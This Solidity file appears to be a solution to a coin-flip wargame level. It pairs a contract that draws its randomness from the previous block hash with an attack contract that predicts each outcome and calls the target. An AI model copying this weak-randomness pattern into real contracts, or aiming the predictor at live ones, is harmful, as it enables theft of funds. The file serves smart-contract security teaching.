// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

    uint256 public consecutiveWins;
    uint256 public lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event flipped(uint hash, uint block);
    constructor() {
        consecutiveWins = 0;
    }

    function get_block() public view returns (uint) {
        return uint256(blockhash(block.number - 1));
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }
        emit flipped(lastHash, blockValue);
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract atk_coinflip {
    address target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function set_target(address addr) public {
        target = addr;
    }

    function flip() public view returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 side = blockValue / FACTOR;
        return side == 1 ? true : false;
    }

    function atk() public {
        bool side = flip();

        CoinFlip(target).flip(side);
    }

}